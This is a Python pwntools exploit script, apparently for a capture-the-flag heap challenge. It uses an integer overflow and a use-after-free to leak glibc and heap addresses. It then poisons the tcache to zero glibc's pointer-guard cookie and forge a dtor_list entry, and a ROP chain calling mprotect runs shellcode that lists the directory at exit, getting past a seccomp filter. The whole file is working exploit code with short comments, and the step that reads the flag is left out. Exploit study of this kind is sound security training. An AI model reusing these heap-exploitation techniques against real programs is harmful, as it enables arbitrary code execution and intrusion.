from pwn import *

context.arch = 'amd64'
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']

p = gdb.debug('./chall_patched', '''
    continue
''')

# name of flag file is randomly generated, necessary to leak it before ORW flag
# seccomp is applied by author to intentionally prevent syscalls including execve, execveat, fork, vfork, clone, and ptrace

# malloc a chunk of size (0-0x54f) with data at first unused index (fill newly allocated chunk with zero bytes first) 
def add_pet(size, data):
    p.sendlineafter(b">>> ", b'1')
    p.sendlineafter(b"Size of name: ", str(size).encode())
    p.sendlineafter(b"Name pet: ", data)
    p.sendlineafter(b"Age pet: ", b'0')
    p.sendlineafter(b"Gender (M/F): ", b'M')
    p.sendlineafter(b"Hobby: ", b'X')
    p.sendlineafter(b"Sound: ", b'X')

# print out a chunk's data at index
def show_pet(index):
    p.sendlineafter(b">>> ", b'3')
    p.sendlineafter(b"Enter pet index to show: \n", str(index).encode())
    p.recvuntil(b"Name: ")
    return p.recvline(drop=True)

# modify a chunk at index with size of data (integer overflow on size)
def edit_pet(index, size, data):
    p.sendlineafter(b">>> ", b'4')
    p.sendlineafter(b"Enter pet index to edit: \n", str(index).encode())
    p.sendlineafter(b"Enter size name to edit: \n", str(size).encode())
    p.sendlineafter(b"Enter name to read: \n", data)

# free a chunk at index
def free_pet(index):
    p.sendlineafter(b">>> ", b'5')
    p.sendlineafter(b"Enter idx to free pet: \n", str(index).encode())

# call exit function to exit program
def exit():
    p.sendlineafter(b">>> ", b'6')

def pointer_guard_encrypt(decrypted: int, pointer_guard: int):
    r_bits = 0x11
    max_bits = 64
    encrypted = ((decrypted^pointer_guard)<<(r_bits%max_bits))&(2**max_bits-1)|(((decrypted^pointer_guard)&(2**max_bits-1))>>(max_bits-(r_bits%max_bits)))
    return encrypted

glibc_e = ELF('./libc.so.6')

# Stage 1: leak glibc base address and heap base address
add_pet(0x18, b'A') # 0: heap_base_addr+0xx2a0
add_pet(0x3f8, b'A') # 1: heap_base_addr+0x2c0
add_pet(0x18, b'A') # 2: heap_base_addr+0x6c0
add_pet(0x18, b'A') # 3: heap_base_addr+0x6e0
# avoid malloc consolidation
add_pet(0x18, b'A') # 4: heap_base_addr+0x700
# integer overflow to modify size of chunk 1 (heap_base_addr+0x2c0) from chunk 0 (heap_base_addr+0x2a0)
edit_pet(0, -1, b'A'*0x18+p64(0x421))
# free chunk 1 (heap_base_addr+0x2c0) of fake size 0x420 into unsorted bin
free_pet(1)
add_pet(0x3f8, b'A') # 1: heap_base_addr+0x2c0
# now first qword of chunk 2 (heap_base_addr+0x6c0) is glibc address
glibc_base_addr = u64(show_pet(2).ljust(8, b'\x00'))-(glibc_e.symbols['main_arena']+96)
log.info(f"glibc base address: {hex(glibc_base_addr)}")
add_pet(0x18, b'A') # 5/2: heap_base_addr+0x6c0
# free chunk 5 (heap_base_addr+0x6c0) of size 0x20 into tcache bin
free_pet(5)
# now use-after-free is available for chunk (heap_base_addr+0x6c0), which is freed at index 5 but not freed at index 2
heap_base_addr = u64(show_pet(2).ljust(8, b'\x00'))<<12
log.info(f"heap base address: {hex(heap_base_addr)}")
# clear tcache bin of size 0x20
add_pet(0x18, b'A') # 5/2: heap_base_addr+0x6c0

# Stage 2: overwrite dtor_list structure for code execution to leak name of flag file
# prepare for first tcache poisoning
free_pet(3)
free_pet(2)
# now tcache bin of size 0x20 is heap_base_addr+0x6c0 -> heap_base_addr+0x6e0
# now use-after-free is available for chunk (heap_base_addr+0x6c0), which is freed at index 2 but not freed at index 5
edit_pet(5, 0x18, p64((glibc_base_addr-0x2890)^((heap_base_addr+0x6c0)>>12)))
# now tcache bin of size 0x20 is heap_base_addr+0x6c0 -> glibc_base_addr-0x2890 (PTR_MANGLE cookie)
# perform first tcache poisoning
add_pet(0x18, b'A') # 2/5: heap_base_addr+0x6c0
# zero PTR_MANGLE cookie
add_pet(0x18, p64(0)) # 3: glibc_base_addr-0x2890 (PTR_MANGLE cookie)
# prepare for second tcache poisoning
free_pet(4)
free_pet(2)
# now tcache bin of size 0x20 is heap_base_addr+0x6c0 -> heap_base_addr+0x700
# now use-after-free is available for chunk (heap_base_addr+0x6c0), which is freed at index 2 but not freed at index 5
edit_pet(5, 0x18, p64((glibc_base_addr-0x2910)^((heap_base_addr+0x6c0)>>12)))
# now tcache bin of size 0x20 is heap_base_addr+0x6c0 -> glibc_base_addr-0x2910 (dtor_list structure)
# perform second tcache poisoning
add_pet(0x18, b'A') # 2/5: heap_base_addr+0x6c0
add_pet(0x18, p64(0)) # 4: glibc_base_addr-0x2910 (dtor_list structure)
# rop chain for: 1. call mprotect(heap_base_addr, 0x1000, 7); 2. jump to shellcode starting from heap_base_addr+0x300
chain = [
    glibc_base_addr+0x10f75b, heap_base_addr, # 0x000000000010f75b: pop rdi; ret;
    glibc_base_addr+0x110a4d, 0x1000, # 0x0000000000110a4d: pop rsi; ret;
    glibc_base_addr+0x188035, 7, # 0x0000000000188035: pop rdx; bsf eax, eax; add rax, rdi; vzeroupper; ret;
    glibc_base_addr+glibc_e.sym.mprotect,
    heap_base_addr+0x300
]
# shellcode for: 1. open('./'); 2. getdents64(3, heap_base_addr+0x1000, 0x100); 3. write(1, heap_base_addr+0x1000, 0x100)
shellcode = asm(shellcraft.open('./'))+asm(shellcraft.getdents64(3, heap_base_addr+0x1000, 0x100))+asm(shellcraft.write(1, heap_base_addr+0x1000, 0x100))
# place rop chain and shellcode into chunk 1, rop chain starting from heap_base_addr+0x2c0 and shellcode starting from heap_base_addr+0x300
edit_pet(1, 0x3f8, b''.join([p64(c) for c in chain])+shellcode)
# integer overflow to fake dtor_list structure to stack pivot to heap_base_addr+0x2c0
# dtor_list->func=glibc_base_addr-0x2908, *(glibc_base_addr-0x2908)=pointer_guard_encrypt(glibc_base_addr+0x5ef6f, 0), rdi=0, rsi=0, rdx=heap_base_addr+0x2c0
edit_pet(4, -1, p64(glibc_base_addr-0x2908)+p64(pointer_guard_encrypt(glibc_base_addr+0x5ef6f, 0))+p64(0)*2+p64(heap_base_addr+0x2c0)) # 0x000000000005ef6f: mov rsp, rdx; ret;
# trigger rop chain on exit
exit()

# Stage 3: repeat script to cat flag file with name (omitted)

p.interactive()